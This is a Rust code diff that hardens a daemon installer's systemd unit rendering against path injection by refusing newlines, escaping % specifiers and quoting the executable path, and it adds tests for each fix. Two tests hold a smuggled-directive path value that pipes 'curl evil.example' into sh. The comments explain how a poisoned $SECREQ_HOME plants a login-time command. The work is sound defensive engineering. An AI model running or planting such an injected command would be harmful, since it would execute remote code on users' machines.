@@ -136,10 +136,17 @@ pub fn render_launchd_plist(exe: &Path, log_path: &Path) -> String {
 /// that login PATH to resolve secrets. `log_path` is referenced in a comment;
 /// systemd journals stdout/stderr itself (`journalctl --user -u secreq`), so
 /// there's no need to redirect to a file the way launchd does.
-pub fn render_systemd_unit(exe: &Path, log_path: &Path) -> String {
-    let exe = exe.display();
-    let log = log_path.display();
-    format!(
+///
+/// Both paths are escaped, and a path that cannot be escaped is refused. A
+/// unit file is line-oriented with no continuation for a literal newline, so
+/// unlike the launchd plist — where XML escaping is total and every byte has a
+/// spelling — there is a class of path this format simply cannot carry.
+pub fn render_systemd_unit(exe: &Path, log_path: &Path) -> Result<String> {
+    let exe = systemd_quote(&exe.display().to_string())?;
+    // A comment, but still a *line*: a newline ends it and hands everything
+    // after to the unit parser. `log_path` is derived from `$SECREQ_HOME`.
+    let log = systemd_escape_specifiers(reject_newlines(&log_path.display().to_string())?);
+    Ok(format!(
         "[Unit]\n\
          Description=secreq consent daemon (SSH agent + wrap consent)\n\
          \n\
@@ -155,7 +162,7 @@ pub fn render_systemd_unit(exe: &Path, log_path: &Path) -> String {
          \n\
          [Install]\n\
          WantedBy=default.target\n"
-    )
+    ))
 }
 
 /// What [`apply`] will do — handed to the caller to show before any file is
@@ -183,7 +190,7 @@ pub fn plan(home: &Path, platform: Platform, exe: &Path, log_path: &Path) -> Res
     let service_file = service_file_path(home, platform);
     let contents = match platform {
         Platform::Macos => render_launchd_plist(exe, log_path),
-        Platform::Linux => render_systemd_unit(exe, log_path),
+        Platform::Linux => render_systemd_unit(exe, log_path)?,
     };
     let already_installed = service_file.exists();
     Ok(InstallPlan {
@@ -330,6 +337,55 @@ fn set_mode_0644(path: &Path) -> Result<()> {
         .with_context(|| format!("could not set mode 0644 on {}", path.display()))
 }
 
+/// Refuse a value carrying a line break.
+///
+/// A systemd unit file is parsed line by line and offers no escape for a
+/// literal newline in a value, so this is the one thing the format cannot
+/// carry — and it is the injection: everything after the break is read as
+/// directives, which is how a `$SECREQ_HOME` with a newline in it plants an
+/// `ExecStartPre=` that runs at every login.
+fn reject_newlines(s: &str) -> Result<&str> {
+    if s.contains(['\n', '\r']) {
+        bail!(
+            "refusing to write a systemd unit for a path containing a newline: {s:?}. \
+             A unit file has no escape for one, so the text after it would be read as \
+             unit directives. Move the path (or $SECREQ_HOME) somewhere without one."
+        );
+    }
+    Ok(s)
+}
+
+/// `%` introduces a systemd specifier (`%h` → the user's home, `%i` → the
+/// instance name), expanded when the unit is loaded. `%%` is the documented
+/// spelling of a literal one, so a path with a `%` in it names the file the
+/// user actually meant.
+fn systemd_escape_specifiers(s: &str) -> String {
+    s.replace('%', "%%")
+}
+
+/// Render `s` as a single `ExecStart=` word.
+///
+/// Unquoted, systemd splits the value on whitespace, so an install under
+/// `/opt/my tools/` silently passed `tools/secreq` as an argument. Inside
+/// double quotes systemd processes C-style backslash escapes, so the two
+/// characters that could close or extend the quoting are escaped, and
+/// specifiers are neutralised as above.
+fn systemd_quote(s: &str) -> Result<String> {
+    let s = reject_newlines(s)?;
+    let mut out = String::with_capacity(s.len() + 2);
+    out.push('"');
+    for ch in s.chars() {
+        match ch {
+            '\\' => out.push_str(r"\\"),
+            '"' => out.push_str("\\\""),
+            '%' => out.push_str("%%"),
+            other => out.push(other),
+        }
+    }
+    out.push('"');
+    Ok(out)
+}
+
 /// Escape the five XML special characters so a path with `&`, `<`, etc. can't
 /// break the plist.
 fn xml_escape(s: &str) -> String {
@@ -398,13 +454,79 @@ mod tests {
     fn systemd_unit_has_execstart_and_wantedby() {
         let exe = Path::new("/home/me/.local/bin/secreq");
         let log = Path::new("/home/me/.local/state/secreq/daemon.log");
-        let unit = render_systemd_unit(exe, log);
+        let unit = render_systemd_unit(exe, log).unwrap();
 
-        assert!(unit.contains("ExecStart=/home/me/.local/bin/secreq daemon --fg"));
+        assert!(unit.contains(r#"ExecStart="/home/me/.local/bin/secreq" daemon --fg"#));
         assert!(unit.contains("Restart=on-failure"));
         assert!(unit.contains("WantedBy=default.target"));
         assert!(unit.contains("Type=simple"));
         assert!(unit.contains("Description=secreq consent daemon (SSH agent + wrap consent)"));
+    }
+
+    // ── S6: the systemd unit interpolated both paths raw ──
+
+    /// The launchd sibling XML-escapes; the systemd one pasted both paths
+    /// straight in. `log_path` derives from `$SECREQ_HOME`, so a value with a
+    /// newline in it ends the comment line it lands on and everything after
+    /// is parsed as unit directives — `ExecStartPre=` runs as this user at
+    /// every login. There is no escape for a newline in a unit file, so the
+    /// only answer is to refuse.
+    #[test]
+    fn systemd_unit_refuses_a_log_path_that_would_inject_a_directive() {
+        let exe = Path::new("/usr/bin/secreq");
+        let log = Path::new("/tmp/x\nExecStartPre=/bin/sh -c 'curl evil.example|sh'\n/daemon.log");
+
+        let err = render_systemd_unit(exe, log).expect_err("must refuse");
+
+        assert!(format!("{err:#}").contains("newline"), "{err:#}");
+    }
+
+    #[test]
+    fn systemd_unit_refuses_an_exe_path_that_would_inject_a_directive() {
+        let exe = Path::new("/tmp/x\nExecStartPre=/bin/sh -c 'curl evil.example|sh'");
+        let log = Path::new("/tmp/daemon.log");
+
+        let err = render_systemd_unit(exe, log).expect_err("must refuse");
+
+        assert!(format!("{err:#}").contains("newline"), "{err:#}");
+    }
+
+    /// systemd splits an unquoted `ExecStart=` on whitespace, so a space in
+    /// the install path silently turned the tail of it into an argument. The
+    /// launchd side never had this — a plist takes an array.
+    #[test]
+    fn systemd_unit_quotes_the_exe_so_a_space_is_not_an_argument() {
+        let exe = Path::new("/opt/my tools/secreq");
+        let unit = render_systemd_unit(exe, Path::new("/tmp/daemon.log")).unwrap();
+
+        assert!(
+            unit.contains(r#"ExecStart="/opt/my tools/secreq" daemon --fg"#),
+            "got: {unit}"
+        );
+    }
+
+    /// `%` starts a systemd specifier, so an unescaped `%h` in the path is
+    /// replaced with the user's home directory and the unit execs something
+    /// else entirely. `%%` is the documented literal.
+    #[test]
+    fn systemd_unit_escapes_a_percent_so_systemd_does_not_expand_it() {
+        let exe = Path::new("/opt/100%h/secreq");
+        let unit = render_systemd_unit(exe, Path::new("/tmp/daemon.log")).unwrap();
+
+        assert!(unit.contains("/opt/100%%h/secreq"), "got: {unit}");
+    }
+
+    /// A quote or a backslash in the path must not close the quoting we just
+    /// added.
+    #[test]
+    fn systemd_unit_escapes_quotes_and_backslashes_inside_the_quoted_exe() {
+        let exe = Path::new(r#"/opt/a"b\c/secreq"#);
+        let unit = render_systemd_unit(exe, Path::new("/tmp/daemon.log")).unwrap();
+
+        assert!(
+            unit.contains(r#"ExecStart="/opt/a\"b\\c/secreq" daemon --fg"#),
+            "got: {unit}"
+        );
     }
 
     #[test]
